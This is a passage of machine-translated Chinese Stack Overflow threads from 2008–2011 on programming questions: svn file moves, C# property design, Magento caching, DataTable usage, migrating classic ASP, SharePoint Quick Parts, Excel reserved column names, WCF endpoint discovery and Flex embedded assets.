> 时间：2008-09-17T20:49:04.270

svn move 一次只移动一个文件。你最好的选择是一个shell循环。在 Bash 中，尝试

```
for f in *.php ; do svn mv $f php-folder/; done 
```

在 Windows 上，这是

```
for %f in (*.php) do svn mv %f php-folder/ 
```

**编辑：**从 Subversion 1.5 开始，`svn mv`接受多个源文件，因此您的原始命令可以工作。只有 svn 1.4.x 和更早版本才需要 shell 循环。（当然，shell 循环仍然适用于 1.5；只是没有必要。）

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-09-17T20:48:00.823

不确定 svn 本身，但是您的 shell 应该能够扩展该通配符并且 svn 可以采用多个源参数，或者您可以使用类似的东西

```
for file in *.php; do svn mv $file php-folder/; done 
```

例如，在 bash shell 中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-01-20T15:30:29.660

`find . -name "*.php" -exec svn mv {} php-folder \;`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:45:42.077

如果您在正确的签出目录中，我不明白为什么它不起作用？您的 shell 应该将 *.php 扩展为 php 文件列表，并且 svn move 接受多个源作为参数。

# c# - “代理属性”是好风格吗？

> ID：87459
> 
> 赞同：3
> 
> 时间：2008-09-17T20:43:07.903
> 
> 标签：c#, coding-style, properties

我有一个带有字符串属性的类，它实际上是几个用分隔符连接的字符串。

我想知道拥有这样的代理属性是否是一种好的形式：

```
public string ActualProperty
{
    get { return actualProperty; }
    set { actualProperty = value; }
}

public string[] IndividualStrings
{
    get { return ActualProperty.Split(.....); }
    set 
    { 
            // join strings from array in propval .... ;
            ActualProperty = propval;
    }
} 
```

有没有我忽略的风险？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T20:53:25.727

在我看来，将两个可设置的属性链接在一起是不好的。如果这确实是您想要的，请切换到使用显式 get/set 方法而不是属性。具有不明显副作用的代码以后几乎总是会咬你。尽可能让事情简单明了。

此外，如果您有一个属性是包含子字符串的格式化字符串，那么看起来您真正想要的是该属性的单独结构/类，而不是滥用原始类型。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T22:06:02.663

似乎数组是真实的数据，而单字符串的东西是一种方便。这很好，但我会说要注意序列化和成员克隆之类的东西，它们将获取和设置两个可写属性。

我想我会的；

*   将数组保留为属性
*   提供一个`GetJoinedString(string seperator)`方法。
*   提供`SetStrings(string joined, string seperator)`or`Parse(string joined, string seperator)`方法。

实际上，字符串中的分隔符并不是真正的类的一部分，而是一个短暂的细节。明确引用它，例如，CSV 应用程序可以传递一个逗号，而制表符分隔的应用程序可以传递一个制表符。这将使您的应用程序更易于维护。此外，它消除了为相同的实际数据使用两个 getter 和 setter 的讨厌问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T20:46:39.347

定义“好”。它不应该中断（除非您未能正确保证传递给的分隔符`Split()`绝不允许在各个字符串本身中使用），但是如果`IndividualStrings`访问的频率比`ActualProperty`您最终解析`actualProperty`的频率要高得多。当然，如果反过来是真的，那么你做得很好......如果两者都被频繁调用以至于任何不必要的解析或连接都是不可接受的，那么只需存储两者并在值更改时重新解析。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-03-06T00:03:04.187

属性旨在成为类的非常简单的成员；获取或设置属性的值应该被认为是**没有明显副作用**的微不足道的操作。

如果设置属性会导致分配属性以外的类的公共值发生更改，这比基本分配更重要，并且可能不再适合该属性。

“复杂”属性是危险的，因为它违背了调用者的期望。属性被解释为字段（具有副作用），但作为您希望能够分配值然后检索该值的字段。通过这种方式，调用者应该期望能够分配给多个属性并在以后再次检索它们的值。

在您的示例中，我无法为这两个属性分配值并检索它们；一个值会影响另一个值。这打破了对该物业的基本预期。如果您创建一种方法来同时为两个属性分配值并将两个属性设为只读，则更容易理解值的设置位置。

**此外，顺便说一句：**

从属性返回临时数组通常被认为是不好的做法。数组可能是不可变的，但它们的内容不是。这意味着您可以更改数组中将与对象一起存在的值。

例如：

```
YourClass i = new YourClass();
i.IndividualStrings[0] = "Hello temporary array!"; 
```

这段代码看起来像是在更改`IndividualStrings`属性中的值，但实际上数组是由属性创建的并且没有分配到任何地方，因此数组和更改将立即超出范围。

```
public string ActualProperty { get; set; }

public string[] GetIndividualStrings()
{
    return ActualProperty.Split(.....);
}

public void SetFromIndividualStrings(string[] values)
{
    // join strings from array .... ;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:46:08.300

好吧，我会说你的“集合”是高风险的，如果有人不知道他们必须传递一个已经连接的值序列，或者你上面的例子可能错过了这一点。如果字符串已经包含分隔符怎么办 - 你会打破。

我确信性能不是很好，具体取决于使用此属性的频率。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T20:47:46.037

我不确定这种设计的好处是什么。我认为拆分在扩展方法中会更好。

至少，我会删除 IndividualStrings 属性上的设置器，或者将其移动到两种方法中：string[] SplitActualProperty() 和 void MergeToActualProperty(string[] 部分)。

# php - 我如何将变量传递给 PHP 中的缓存内容？

> ID：87468
> 
> 赞同：0
> 
> 时间：2008-09-17T20:43:45.017
> 
> 标签：php, caching, variables

本质上，我有一个 PHP 页面，它调用了一些其他 HTML 以通过对象的方法呈现。它看起来像这样：

我的 PHP 页面：

```
// some content...

<?php
    $GLOBALS["topOfThePage"] = true;
    $this->renderSomeHTML();
?>

// some content...

<?php
    $GLOBALS["topOfThePage"] = false;
    $this->renderSomeHTML();
?> 
```

第一个方法调用被缓存，但我需要 renderSomeHTML() 根据其在页面中的位置显示略有不同。我尝试传递给 $GLOBALS，但值没有改变，所以我假设它正在被缓存。

如果不通过方法传递参数或不缓存它，这是不可能的吗？任何帮助表示赞赏。这不是我的应用程序——它是 Magento。

**编辑：**

这是 Magento，它看起来正在使用 memcached。我试图通过 renderSomeHTML() 传递一个参数，但是当我在要呈现的 PHP 包含上使用 func_get_args() 时，出来的不是我放入其中的。

**编辑：**

再往下，我能够通过调用一个提取相同内容的不同方法并传入一个关闭缓存的参数来“使”缓存“无效”。感谢大家的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:49:59.930

显然，你不能。缓存的全部意义在于您缓存的“东西”不会改变。所以你要么：

*   提供一个参数
*   避免缓存
*   设置不同参数时使缓存无效

或者，您自己重写缓存机制 - 以支持一些动态绑定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T20:47:36.830

不同的框架对 Chaching 的处理方式不同，因此您必须帮助我们提供更多信息。但我也想知道你是否可以将它作为参数传递而不是使用`$GLOBALS.`

```
$this->renderSomeHTML(true); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:51:16.590

您的问题似乎不清楚，但缓存几乎意味着“存储因此我们不必再次计算它”。如果您希望内容有所不同，您需要缓存更多结果并选择正确的缓存对象之一发回。

需要更多信息才能给出更好的答案。什么是缓存文档，Smarty？“它在页面中的位置”是什么意思？它是什么'？

# c# - 我应该在我的 C# 应用程序中使用多少个 DataTable 对象？

> ID：87514
> 
> 赞同：2
> 
> 时间：2008-09-17T20:47:56.533
> 
> 标签：c#, .net, sql-server, datatable, dataset

我是一位经验丰富的程序员，使用传统（但面向对象）开发工具并切换到 C#/.Net。我正在使用 SQL Server CE 3.5 编写一个小型单用户应用程序。我已经阅读了概念数据集和相关文档，并且我的代码有效。

现在我想确保我做的“正确”，从经验丰富的 .Net/SQL Server 编码人员那里获得一些反馈，这些反馈是你从阅读文档中得不到的。

我注意到我在几个地方有这样的代码：

```
var myTableDataTable = new MyDataSet.MyTableDataTable();
myTableTableAdapter.Fill(MyTableDataTable);

... // other code 
```

在单用户应用程序中，您是否通常只在应用程序启动时执行此操作，为每个表实例化一个 DataTable 对象，然后为其存储一个引用，以便您只使用已填充数据的单个对象？这样，您将只能从数据库中读取一次数据，而不是可能多次读取数据。或者这个开销太小以至于无关紧要（加上大表可能会适得其反）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:50:33.267

对于 CE，这可能不是问题。如果您将此应用程序推送给成千上万的用户并且他们都在访问一个集中式数据库，那么您可能需要花一些时间进行优化。在像 CE 这样的单用户实例数据库中，除非您有需要优化的数据，否则我不会花任何时间担心它。过早优化等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T20:55:46.267

决定的方式在 2 个主要的几件事之间有所不同 1\. 数据是否会不断被访问 2\. 是否有很多数据

如果您经常使用表中的数据，请在首次使用时加载它们。如果您只是偶尔使用数据，请在需要时填写表格，然后将其丢弃。

例如，如果您有 10 个 gui 屏幕并且仅在其中 1 个上使用 myTableDataTable，则仅在该屏幕上读取它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:01:48.637

选择实际上并不取决于 C# 本身。它归结为以下之间的平衡：

1.  您多久使用一次代码中的数据？
2.  数据是否会改变（你是否关心它是否改变）？
3.  与您的代码所做的其他事情相比，再次获取数据的相对（时间）成本是多少？
4.  与*开发人员的工作量/时间*（对于这个特定的应用程序）相比，您对*性能*有多少重视？

 *作为一般规则：对于数据不经常更改的生产应用程序，我可能会创建一次 DataTable，然后按照您提到的那样保留参考。我还会考虑将数据放在类型化的集合/列表/字典中，而不是通用的 DataTable 类中，如果没有别的，因为让编译器更容易捕捉到我的打字错误。

对于您为自己运行的“开始，完成它的事情并结束”的简单实用程序，它可能不值得付出努力。

您在询问有关 Windows CE 的问题。出于这种特殊考虑，我很可能只进行一次查询并保留结果。移动操作系统在电池和空间方面有桌面软件所没有的额外限制。基本上，移动操作系统使第 4 条更加重要。

每次从 SQL 添加另一个检索调用时，都会更频繁地调用外部库，这意味着您可能会运行更长时间，更频繁地分配和释放更多内存（这会增加碎片），并可能导致从数据库重新读取闪存。假设您可以（参见第 2 条），一旦拥有数据，最好保留数据。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T02:05:22.217

当您将数据集视为数据的“会话”时，更容易找出这个问题的答案。您填写数据集；你和他们一起工作；然后在完成后将数据放回或丢弃。所以你需要问这样的问题：

1.  **数据需要多高？** 您是否总是需要最新的，或者数据库不会经常更改？
2.  **你用这些数据做什么？** 如果您只是将它用于报告，那么您可以轻松地填充数据集，运行报告，然后丢弃数据集，下次只需创建一个新数据集。无论如何，这将为您提供更多当前数据。
3.  **我们在谈论多少数据？** 您已经说过您正在使用一个相对较小的数据集，因此如果您将其全部加载到内存中并永远保存在那里，则不会对内存产生重大影响。

既然你说它是一个没有大量数据的单用户应用程序，我认为你一开始就可以安全地加载所有内容，在数据集中使用它，然后在关闭时更新。

在这种情况下你需要关心的主要是：如果应用程序由于崩溃、断电等原因异常退出怎么办？用户会失去所有工作吗？但是碰巧的是，数据集非常容易序列化，因此您可以相当容易地实现“每隔一段时间保存一次”过程来将数据集内容序列化到磁盘，这样用户就不会丢失很多工作。

# python - 如果决定我们的系统需要大修，最好的方法是什么？

> ID：87522
> 
> 赞同：3
> 
> 时间：2008-09-17T20:48:45.610
> 
> 标签：python, asp-classic, vbscript

我们正在维护一个使用 VBScript 作为主要语言基于 Classic ASP 构建的 Web 应用程序。我们一致认为我们的后端（如果您愿意的话是框架）已经过时并且没有为我们提供快速前进的适当工具。我们几乎已经接受了无处不在的当前 webMVC 模式，并且无法以合理的方式使用当前的技术来做到这一点。最大的缺失特性是正确的调度和继承模板等。

目前有两条路径正在讨论：

1.  使用 JScript 将现有应用程序移植到 Classic ASP，这将使我们有希望从那里转到 .NET MSJscript 而没有太多麻烦，并最终在 .NET 平台上结束（最好 MVC 的东西到那时就完成了，ASP.NET）。在我们看来，NET 并没有比现在好多少）。这被认为是比下一个选择更安全、风险更低的路径，尽管它可能需要更长的时间。
2.  使用其他一些技术完全重写应用程序，现在这个包的领导者是 Python WSGI，它有一个自定义框架、ORM 和一个很好的模板解决方案。这里甚至还有 django 和其他预建解决方案的回旋余地。这种方法有望成为最快的解决方案，因为我们可能会在实际产品旁边运行测试版，但如果我们不能/不正确，它确实有可能浪费大量时间。

这并不意味着我们的逻辑消失了，因为我们多年来建立的东西相当稳定，正如我们所说的那样难以处理。它建立在 SQL Server 2005 之上，大量使用存储过程，并在 IIS 6 上发布，只是为了提供更多背景知识。

现在，问题。有没有人采取上述两条路径中的任何一条？如果是这样，它是否成功，它怎么可能更好，等等。我们不希望在做这两件事中偏离太多，但一些建议或其他解决方案可能会有所帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-09-18T02:19:51.713

不要扔掉你的代码！

这是您可能犯的最严重的错误（在大型代码库上）。请参阅[您不应该做的事情，第 1 部分](http://www.joelonsoftware.com/articles/fog0000000069.html)。

您已经在旧代码上投入了大量精力并解决了许多错误。把它扔掉是一个典型的开发人员错误（我已经做过很多次了）。它让你感觉“更好”，就像大扫除一样。但是您不需要购买新公寓和所有新家具来装备您的房子。你可以一次在一个房间里工作……也许有些事情只需要一个新的油漆工作。因此，这就是重构的用武之地。

对于您的应用程序中的新功能，[用 C# 编写它并从您的经典 ASP 中调用它](http://blog.danbartels.com/articles/322.aspx)。当你重写这个新代码时，你将被迫模块化。当您有时间时，也可以将部分旧代码重构为 C#，并随时解决错误。最终，您将使用所有新代码替换您的应用程序。

您也可以编写自己的编译器。我们很久以前为我们的经典 ASP 应用程序编写了一个，以允许我们输出 PHP。它叫做[芥末](http://www.joelonsoftware.com/items/2006/09/01b.html)，我认为这就是杰夫阿特伍德认为乔尔斯波尔斯基失控的原因。实际上，也许我们应该把它寄出去，然后你就可以使用它了。

它允许我们将整个代码库切换到 .NET 以用于下一个版本，同时只重写我们源代码的一小部分。也让很多人骂我们疯了，但是写一个编译器也没那么复杂，给了我们很大的灵活性。

此外，如果这是一个仅限内部的应用程序，请离开它。不要重写它——你是唯一的客户，如果你需要将它作为经典的 asp 运行，你可以满足这个要求。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-09-17T20:53:43.213

以此为契机，删除未使用的功能！一定要使用新语言。称之为 2.0。重建你真正需要的 80% 的工作量会少很多。

首先从整个应用程序中清除您的大脑。坐下来列出其总体目标，然后根据使用的功能决定需要哪些功能。然后根据这些功能重新设计它，然后构建。

（我喜欢删除代码。）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-09-17T21:44:51.437

它的效果比你想象的要好。

最近，我对一个可怕的旧 C 代码集合进行了一项大型逆向工程工作。逐个函数我将仍然相关的特性重新分配到类中，为类编写单元测试，并构建了一个看起来像替换应用程序的东西。它有一些通过类的原始“逻辑流”，并且一些类设计得很糟糕[主要是因为全局变量的一个子集太难以梳理。]

它通过了类级别和整个应用程序级别的单元测试。遗留源代码主要用作一种“C 语言规范”，以找出真正晦涩难懂的业务规则。

去年，我写了一个替换 30 年的 COBOL 的项目计划。客户倾向于 Java。作为规划工作的一部分，我使用 Django 在 Python 中对修改后的数据模型进行了原型设计。在我完成计划之前，我可以演示核心交易。

**注意**：在 Django 中构建模型和管理界面比将项目规划为一个整体要快。

由于“我们需要使用 Java”的心态，最终的项目将比完成 Django 演示更大更昂贵。没有真正的价值来平衡该成本。

此外，我为需要成为 Web 应用程序的 VB 桌面应用程序做了相同的基本“Django 原型”。我在 Django 中构建了模型，加载了遗留数据，并在几周内启动并运行。我使用该工作原型来指定其余的转换工作。

**注意**：我有一个可用的 Django 实现（仅限模型和管理页面），我用它来计划其余的工作。

在 Django 中进行这种原型设计的最好的部分是，您可以在模型、单元测试和管理页面中乱七八糟，直到您做**对**为止。一旦模型正确，您就可以将剩下的时间花在摆弄用户界面上，直到每个人都满意为止。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-09-17T21:08:42.273

不管你做什么，看看你是否能设法遵循一个你不必一次性移植应用程序的计划。抛开一切从头开始是很诱人的，但如果你能逐渐做到这一点，你所犯的错误就不会花费太多，也不会引起如此多的恐慌。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-19T10:56:06.033

半年前，我接管了一个大型 Web 应用程序（幸运的是已经在 Python 中），它存在一些主要的架构缺陷（模板和代码混合，代码重复，你说的......）。

我的计划是最终让系统响应 WSGI，但我还没有。我发现最好的方法是小步骤。在过去的 6 个月中，代码重用率有所提高，并且进展加快。

对我有用的一般原则：

1.  丢弃未使用或注释掉的代码
2.  扔掉所有没用的评论
3.  定义应用程序的*层层次结构*（模型、业务逻辑、视图/控制器逻辑、显示逻辑等）。这不必是非常明确的架构，而是应该*帮助您考虑应用程序的各个部分*并帮助您更好地对代码进行分类。
4.  如果某些东西严重违反了这个层次结构，请更改有问题的代码。移动代码，在另一个地方重新编码，等等。同时调整应用程序的其余部分以使用此代码而不是旧代码。如果不再使用，请将旧的扔掉。
5.  **让您的 API 保持简单！**

进展可能非常缓慢，但应该值得。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T20:55:23.100

我不会推荐 JScript，因为那绝对是少有人走的路。ASP.NET MVC 正在迅速成熟，我认为您可以开始迁移到它，同时随着 ASP.NET MVC 框架的完成而加速。另一种选择是使用类似 ASP.NET w/Subsonic 或 NHibernate 的东西。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-18T02:23:49.673

不要尝试使用 2.0（比当前存在或计划的更多功能），而是构建您的新平台，以解决代码库的当前问题（可维护性/速度/wtf）并从那里开始。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-27T00:10:31.847

如果您正在考虑迁移到 Python，一个好的开始是在 Django 中重写您的管理员界面。这将帮助您解决一些问题，使 Python 启动并与 IIS 一起运行（或将其迁移到 Apache）。说到这，我推荐[isapi-wsgi](http://code.google.com/p/isapi-wsgi/)。到目前为止，这是启动和运行 IIS 的最简单方法。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-06-15T02:33:35.893

我同意 Michael Pryor 和 Joel 的观点，即继续发展现有的代码库而不是从头开始重写几乎总是一个更好的主意。通常有机会重写或重构某些组件以提高性能或灵活性。

# sharepoint - 带有 Word 快速部件和文档信息面板的 SharePoint 自定义内容功能

> ID：87535
> 
> 赞同：2
> 
> 时间：2008-09-17T20:50:16.077
> 
> 标签：sharepoint, ms-word, moss, infopath

我正在为 MOSS 创建一个自定义内容类型功能，该功能还将包含一个 Word 2007 文档作为文档模板。对于内容类型中的所有字段，同一个 Word 文档还将具有*文档信息面板*(DIP) 和*快速部件*。

问题是，部署我的功能后，Word 文档的快速部件似乎不再绑定到文档库中内容类型的列。例如，如果您：

1.  在快速部分中键入一个值
2.  将 Word 文档保存到文档库
3.  查看文档属性；

刚刚键入的值未列出。但是，如果您使用 DIP 指定值（而不是快速部分）然后保存它，它确实会保存为元数据。

我的内容类型的“文档信息面板设置”屏幕就像没有 InfoPath 模板一样。果然，如果我重新上传（或创建新的）InfoPath 模板，那么上述问题就会消失。

**如何在无需执行上述手动步骤的情况下使其在我的功能中工作？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-18T04:09:39.467

可以为 DIP 定义自定义模板并将其部署到站点，将内容类型设置为链接到该模板。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-01-25T08:43:40.390

我在博客中找到了解决方案，但您必须使用 InfoPath... 这是链接：在 Word 文档中使用 SharePoint 元数据 – 查找列

[http://vspug.com/maartene/2009/03/13/using-sharepoint-metadata-in-word-documents-the-lookup-column-issue/](http://vspug.com/maartene/2009/03/13/using-sharepoint-metadata-in-word-documents-the-lookup-column-issue/)

# excel - Excel 列名称

> ID：87541
> 
> 赞同：0
> 
> 时间：2008-09-17T20:50:49.303
> 
> 标签：excel, ado.net

使用 ADO 创建 Excel 电子表格时不能使用哪些列名。

我有一个在电子表格中创建页面的语句：

```
CREATE TABLE [TableName] (Column string, Column2 string); 
```

我发现在执行语句时使用`Date`or的列名`Container`会产生错误。

是否有人拥有不能用作列名的完整（或部分）单词列表？这适用于用户驱动的环境，最好“修复”列而不是崩溃。

我的解决方法是分别用and替换任何出现的`Date`or 。`Container``Date_``Container_`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-09-17T20:55:59.743

以下是 MS Query 的保留字：

[http://support.microsoft.com/kb/125948](http://support.microsoft.com/kb/125948)

单元命名规则：

[http://ezinearticles.com/?Rules-For-Naming-Cells-in-Microsoft-Excel&id=218607](http://ezinearticles.com/?Rules-For-Naming-Cells-in-Microsoft-Excel&id=218607)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T20:57:21.503

这似乎更像是 SQL 保留字的问题。这是一个[很好的清单](http://developer.mimer.com/validator/sql-reserved-words.tml "SQL 保留字")

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:00:02.993

您可以对任何字段名使用方括号，例如：

```
CREATE TABLE [TableName] ([Date] string, [Container] string) 
```

完整示例：

```
using (OleDbConnection conn = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=C:\\temp\\test.xls;Extended Properties='Excel 8.0;HDR=Yes'"))
{
  conn.Open();
  OleDbCommand cmd = new OleDbCommand("CREATE TABLE [TableName] ([Date] string, [Container] string)", conn);
  cmd.ExecuteNonQuery();
} 
```

# .net - 使 WCF 更易于配置

> ID：87542
> 
> 赞同：14
> 
> 时间：2008-09-17T20:50:49.600
> 
> 标签：.net, wcf, configuration

我有一组由桌面应用程序动态连接的 WCF Web 服务。

我的问题是 WCF 需要工作的非常详细的配置设置。让 SSL 工作涉及自定义设置。让 MTOM 或其他任何东西工作需要更多。你要压缩吗？又来了...

WCF 真的很强大——你可以使用许多不同的方式来连接，但似乎都涉及到很多详细的配置。如果主机和客户端不完全匹配，您将很难破译错误。

我想让桌面应用程序更容易配置——最好是某种自动发现。桌面应用程序的用户应该能够输入 URL，然后它会完成其余的工作。

有谁知道这样做的好方法？

我知道 Visual Studio 可以为您设置配置，但我希望桌面应用程序能够基于各种不同的服务器设置来完成。

我知道 VS 的工具可以在外部使用，但我正在寻找桌面应用程序的用户不必是 WCF 专家。我知道 MS 故意让这变得过于复杂。

是否有任何方法、机制、第 3 方库或任何东西可以自动发现 WCF 设置？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-09-19T06:30:49.650

有关端点的所有信息都在服务的元数据中可用，您可以编写客户端来探索服务的元数据并配置客户端。对于代码示例，您可以查看来自 Juval Lowy 的这个出色的[Mex Explorer 。](http://www.idesign.net/idesign/DesktopDefault.aspx?tabindex=-1&tabid=19&download=158)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-19T11:27:26.910

谢谢，那是有用的代码（+1）。

不过，它有点混乱，有一些错误（例如，不应该进行区分大小写的检查），有很​​多我不需要的 UI 功能，并且重复了很多代码。

我从中获取了实际的发现机制，重新编写了它并且几乎让它工作（连接，但需要一些技巧）。

首先是 main 方法使用的一些 util 函数：

```
/// <summary>If the url doesn't end with a WSDL query string append it</summary>
static string AddWsdlQueryStringIfMissing( string input )
{
    return input.EndsWith( "?wsdl", StringComparison.OrdinalIgnoreCase ) ?
        input : input + "?wsdl";
}

/// <summary>Imports the meta data from the specified location</summary>
static ServiceEndpointCollection GetEndpoints( BindingElement bindingElement, Uri address, MetadataExchangeClientMode mode )
{
    CustomBinding binding = new CustomBinding( bindingElement );
    MetadataSet metadata = new MetadataExchangeClient( binding ).GetMetadata( address, mode );
    return new WsdlImporter( metadata ).ImportAllEndpoints();
} 
```

然后是一个尝试不同方式连接并返回端点的方法：

```
public static ServiceEndpointCollection Discover( string url )
{
    Uri address = new Uri( url );
    ServiceEndpointCollection endpoints = null;

    if ( string.Equals( address.Scheme, "http", StringComparison.OrdinalIgnoreCase ) )
    {
        var httpBindingElement = new HttpTransportBindingElement();

        //Try the HTTP MEX Endpoint
        try { endpoints = GetEndpoints( httpBindingElement, address, MetadataExchangeClientMode.MetadataExchange ); }
        catch { }

        //Try over HTTP-GET
        if ( endpoints == null )
            endpoints = GetEndpoints( httpBindingElement,
                new Uri( AddWsdlQueryStringIfMissing( url ) ), MetadataExchangeClientMode.HttpGet );
    }
    else if ( string.Equals( address.Scheme, "https", StringComparison.OrdinalIgnoreCase ) )
    {
        var httpsBindingElement = new HttpsTransportBindingElement();

        //Try the HTTPS MEX Endpoint
        try { endpoints = GetEndpoints( httpsBindingElement, address, MetadataExchangeClientMode.MetadataExchange ); }
        catch { }

        //Try over HTTP-GET
        if ( endpoints == null )
            endpoints = GetEndpoints( httpsBindingElement,
                new Uri( AddWsdlQueryStringIfMissing( url ) ), MetadataExchangeClientMode.HttpGet );
    }
    else if ( string.Equals( address.Scheme, "net.tcp", StringComparison.OrdinalIgnoreCase ) )
        endpoints = GetEndpoints( new TcpTransportBindingElement(), 
            address, MetadataExchangeClientMode.MetadataExchange );

    else if ( string.Equals( address.Scheme, "net.pipe", StringComparison.OrdinalIgnoreCase ) )
        endpoints = GetEndpoints( new NamedPipeTransportBindingElement(), 
            address, MetadataExchangeClientMode.MetadataExchange );

    return endpoints;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-12-02T16:45:10.223

现在有另一种方法可以做到这一点，当我问最初的问题时它是不可用的。Microsoft 现在支持 WCF 服务的 REST。

*   使用 REST 的缺点是丢失了 WSDL。
*   好处是最小的配置，你的 WCF 合约接口仍然可以工作！

你需要一个新的参考`System.ServiceModel.Web`

`WebInvoke`使用或标记您的操作`WebGet`

```
//get a user - note that this can be cached by IIS and proxies
[WebGet]
User GetUser(string id )

//post changes to a user
[WebInvoke]
void SaveUser(string id, User changes ) 
```

将这些添加到站点很容易 - 添加`.svc`文件：

```
<%@ServiceHost 
   Service="MyNamespace.MyServiceImplementationClass" 
   Factory="System.ServiceModel.Activation.WebServiceHostFactory" %> 
```

工厂生产线告诉 ASP.net 如何激活端点 - 您根本不需要服务器端配置！

然后构建你`ChannelFactory`的几乎没有变化，除了你不再需要指定一个端点（或者像我在其他答案中那样自动发现一个端点）

```
var cf = new WebChannelFactory<IMyContractInterface>();
var binding = new WebHttpBinding();

cf.Endpoint.Binding = binding;
cf.Endpoint.Address = new EndpointAddress(new Uri("mywebsite.com/myservice.svc"));
cf.Endpoint.Behaviors.Add(new WebHttpBehavior());

IMyContractInterface wcfClient = cf.CreateChannel();

var usr = wcfClient.GetUser("demouser");
// and so on... 
```

请注意，我没有指定或发现客户端配置 - 不需要本地配置！

另一个很大的好处是您可以轻松切换到 JSON 序列化 - 这允许 Java、ActionScript、Javascript、Silverlight 或其他任何可以轻松处理 JSON 和 REST 的东西使用相同的 WCF 服务。

# apache-flex - 在 Flex/AS3 中，如何使用 getDefinitionByName 获取嵌入式资产的类定义

> ID：87557
> 
> 赞同：5
> 
> 时间：2008-09-17T20:52:53.933
> 
> 标签：apache-flex, flash, actionscript-3, actionscript, embed

我有一门包含许多嵌入式资产的课程。

在类中，我想按名称获取资产的类定义。我尝试过使用 getDefinitionByName() 和 ApplicationDomain.currentDomain.getDefinition() 但都不起作用。

例子：

```
public class MyClass
{
  [Embed(source="images/image1.png")] private static var Image1Class:Class;
  [Embed(source="images/image2.png")] private static var Image2Class:Class;
  [Embed(source="images/image3.png")] private static var Image3Class:Class;

  private var _image:Bitmap;

  public function MyClass(name:String)
  {
    var ClassDef:Class = getDefinitionByName(name) as Class;  //<<-- Fails
    _image = new ClassDef() as Bitmap;    
  }
}

var cls:MyClass = new MyClass("Image1Class"); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-09-17T20:57:33.703

这不能回答你的问题，但它可能会解决你的问题。我相信做这样的事情应该有效：

```
public class MyClass
{
  [Embed(source="images/image1.png")] private static var Image1Class:Class;
  [Embed(source="images/image2.png")] private static var Image2Class:Class;
  [Embed(source="images/image3.png")] private static var Image3Class:Class;

  private var _image:Bitmap;

  public function MyClass(name:String)
  {
    _image = new this[name]() as Bitmap;    
  }
}

var cls:MyClass = new MyClass("Image1Class"); 
```

我很难记住括号表示法是否适用于密封类。如果不是，一个简单的解决方案是将类标记为动态的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2011-04-28T13:06:31.640

您的方法不起作用的原因是因为 "Image1Class" 是一个*变量*名，而不是实际的*Class name*。

你可以像这样得到类名

```
import flash.utils.getQualifiedClassName;
trace(getQualifiedClassName(Image1Class)); 
```

如您所见，这意味着您的类名（应该传递给函数的类名）类似于`MyClass_Image1Class`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T21:01:37.047

您不需要使用任何花哨的 getDefinitionByName() 方法，只需动态引用它即可。在您的情况下，将“失败”行替换为：

```
var classDef:Class = MyClass[name] as Class; 
```

那应该这样做。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-06-21T04:22:40.430

非常感谢！我花了将近 5 个小时试图让 POS getDefinitionByName 与我准备扔东西的 getQualifiedClassName 一起工作！我的最终工作代码看起来像这样，甚至从数组中获取字符串名称。

CreatureParam 是一个二维字符串数组；

类型是一个整数，由 HTML 标记发送到 flash，而 HTML 标记又通过 PHP 来自 MYSQL 数据库。

Mark1_cb 是舞台上的一个组合框，并有一个实例名称。它的输出也是一个整数。

因此，下面的代码直接从外部 swf“ArtLibrary.swf”导入类“BirdBodyColor_mc”。BirdBodyColor_mc 是从 png 图像创建的影片剪辑。请注意，您必须双击 ArtLibrary.fla 中的影片剪辑并插入第二个关键帧。影片剪辑显然需要两帧，否则闪存会尝试将其作为精灵导入并导致类型不匹配。

[嵌入(source="ArtLibrary.swf", symbol="BirdBodyColor_mc")] var BirdBodyColor_mc:Class;

通常我会使用这段代码将这个movieclip 类的一个实例放到舞台上。

myMC:MovieClip = new BirdBodyColor_mc(); addChild(myMC);

var 定义：Class = this["BirdBodyColor_mc"] as Class; var Mark1:MovieClip = new Definition();

但我需要使用在我的数组中查找的字符串值来执行此操作。所以这里是代码。

var 定义：Class = this[CreatureParam[Type][Mark1_cb + 2]] as Class；var Mark1:MovieClip = new Definition();

